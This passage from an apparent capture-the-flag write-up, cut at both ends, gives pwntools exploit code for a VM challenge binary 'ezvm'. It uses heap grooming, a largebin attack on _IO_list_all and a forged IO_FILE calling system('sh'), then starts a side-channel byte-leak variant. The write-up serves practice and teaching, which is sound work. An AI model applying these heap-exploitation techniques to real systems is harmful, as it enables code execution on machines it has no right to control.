class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ezvm&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># p = process(&#x27;./ezvm&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;&quot;</span>,)<br><br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">1</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">4</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">8</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">And</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">9</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jmp</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xe</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jnz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xf</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x10</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">eq</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x11</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">regIdx,imm</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x14</span>) + p8(regIdx) + pack(imm)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">store</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x15</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x16</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">halt</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x17</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">other</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xff</span>)<br><br><span class="hljs-comment"># Take from code below</span><br>main_arena_d96 = <span class="hljs-number">0x7ffff7fa5ce0</span><br>TARGET = <span class="hljs-number">0x000055555555a4c0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_libc_addr</span>(<span class="hljs-params">Mem_idx,Addr</span>):<br>    <span class="hljs-keyword">return</span> push(<span class="hljs-number">3</span>) + mov(<span class="hljs-number">0</span>,Addr-main_arena_d96) + push(<span class="hljs-number">0</span>) + add() + pop(<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,Mem_idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_heap_addr</span>(<span class="hljs-params">Mem_idx,Addr</span>):<br>    <span class="hljs-keyword">return</span> push(<span class="hljs-number">2</span>) + mov(<span class="hljs-number">0</span>,Addr-TARGET) + push(<span class="hljs-number">0</span>) + add() + pop(<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,Mem_idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_chain</span>(<span class="hljs-params">start_idx,chain</span>):<br>    code = <span class="hljs-string">&#x27;&#x27;</span><br>    idx = start_idx<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(chain)):<br>        <span class="hljs-keyword">if</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &gt;= <span class="hljs-number">0x7000</span> <span class="hljs-keyword">and</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &lt;= <span class="hljs-number">0x7fff</span>:<br>            code += write_libc_addr(idx,chain[i])<br>            idx += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &gt;= <span class="hljs-number">0x5000</span> <span class="hljs-keyword">and</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &lt; <span class="hljs-number">0x7000</span>:<br>            code += write_heap_addr(idx,chain[i])<br>            idx += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            code += mov(<span class="hljs-number">0</span>,chain[i]) + store(<span class="hljs-number">0</span>,idx)<br>            idx += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_vm</span>(<span class="hljs-params">codeSize,memoryCount,code</span>):<br>    sl(<span class="hljs-string">&quot;yes&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Please input your code size:&quot;</span>,<span class="hljs-built_in">str</span>(codeSize))<br>    sla(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>,<span class="hljs-built_in">str</span>(memoryCount))<br>    sla(<span class="hljs-string">&quot;Please input your code:&quot;</span>,<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">heap_spary</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    code = halt()<br>    run_vm(size,<span class="hljs-number">0x430</span>//<span class="hljs-number">8</span>,code)<br>    pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Heap Fengshui</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>):<br>    heap_spary(i*<span class="hljs-number">0x10</span>)<br>memory_addr = <span class="hljs-number">0x55555555a290</span> + <span class="hljs-number">0x10</span><br>code = <span class="hljs-string">&#x27;&#x27;</span><br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x00000000000004e1</span>) <span class="hljs-comment"># 0x120+0x130+0x140+0x150+1</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a3a8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x00000000000004f1</span>) <span class="hljs-comment"># Largebin little bigger than unsorted</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a4c8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x55555555a9e0</span> - <span class="hljs-number">0x55555555a9b0</span>+<span class="hljs-number">1</span>) <span class="hljs-comment"># Repair Heap</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a9b8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x2000000000000000</span>+<span class="hljs-number">0x108</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4f0 into Unsortedbin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x120</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4f0 into Largebin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x750000</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4e0 into Unsortedbin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt() <br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x110</span>//<span class="hljs-number">8</span>,code) <br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Calculate to Largebin Attack _IO_list_all while makeing Fake_IO_FILE &lt; b *$rebase(0x2248) p *(struct _IO_FILE_plus *)0x55555555a4c0 &gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>memory_addr = <span class="hljs-number">0x55555555a3a0</span> + <span class="hljs-number">0x10</span><br>_IO_list_all = <span class="hljs-number">0x7ffff7fa6680</span><br>TARGET = <span class="hljs-number">0x000055555555a4c0</span><br>main_arena_d96 = <span class="hljs-number">0x7ffff7fa5ce0</span><br>_IO_wfie_jumps = <span class="hljs-number">0x7ffff7fa20c0</span><br>chain = [TARGET,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,TARGET+<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>] + [<span class="hljs-number">0</span>]*(((<span class="hljs-number">0xd8</span>-<span class="hljs-number">0xc0</span>)//<span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) + [_IO_wfie_jumps+<span class="hljs-number">0x30</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x7ffff7ddcd60</span>,TARGET+<span class="hljs-number">0xd0</span>] <span class="hljs-comment"># _lock... _wide_data... system</span><br>code = <span class="hljs-string">&#x27;&#x27;</span><br>code += load(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)  <span class="hljs-comment"># 0x7ffff7fa5ce0 &lt;main_arena+96&gt;</span><br>code += load(<span class="hljs-number">2</span>,(TARGET + <span class="hljs-number">0x20</span> - memory_addr)//<span class="hljs-number">8</span>) <span class="hljs-comment"># (Victim&#x27;s Largebin -&gt; bk) -&gt; 0x55555555a4e0: 0x000055555555a4c0 &lt; - Largebin Addr</span><br>code += write_chain((TARGET + <span class="hljs-number">0x28</span> - memory_addr)//<span class="hljs-number">8</span>,[_IO_list_all-<span class="hljs-number">0x20</span>])<br>code += write_chain((TARGET + <span class="hljs-number">0x88</span> - memory_addr)//<span class="hljs-number">8</span>,chain)<br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4d8</span>//<span class="hljs-number">8</span>,code) <span class="hljs-comment"># 0x4e0 Unsortedbin </span><br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Trigger Largebin Attack,repair FAKE_IO_FILE</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>chain = [<span class="hljs-number">0x6873</span>,<span class="hljs-number">0x4f1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]<br>code = write_chain((TARGET - memory_addr)//<span class="hljs-number">8</span>,chain)<br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4c8</span>//<span class="hljs-number">8</span>,code)<br>sl(<span class="hljs-string">&#x27;bye bye&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220921201658577.png" alt="exp"></p><h3 id="思路二-Side-channel-leak"><a class="header-anchor" href="#思路二-Side-channel-leak">¶</a>思路二 Side-channel leak</h3><p>赛后学的思路，感觉很巧妙，利用的是输出的多少行 <code>what</code> 反推字节数，👴🏻 们tql。</p><p>这个虚拟机给出的命令很全，可以写一个 <code>equal() jnz()</code> 这样的循环来侧信道爆破字节，从0开始爆破，如果相等的话就跳转到结束，否则输出一行报错，最后记录输出的行数即可推出该字节为多少。</p><p>Leak 出来后可以打 IO，我这里打的是 <code>call_dtor_list</code>，差别不大。</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ezvm&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&#x27;./ezvm&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;&quot;</span>,)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">1</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">4</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">8</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">And</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">9</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jmp</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xe</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jnz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xf</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x10</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">eq</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x11</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">regIdx,imm</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x14</span>) + p8(regIdx) + pack(imm)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">store</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x15</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x16</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">halt</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x17</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">other</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xff</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_vm</span>(<span class="hljs-params">codeSize,memoryCount,code</span>):<br>    sl(<span class="hljs-string">&quot;yes&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Please input your code size:&quot;</span>,<span class="hljs-built_in">str</span>(codeSize))<br>    sla(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>,<span class="hljs-built_in">str</span>(memoryCount))<br>    sla(<span class="hljs-string">&quot;Please input your code:&quot;</span>,<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_byte</span>(<span class="hljs-params">addr_offset,byte_offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    payload = [<br>        load(<span 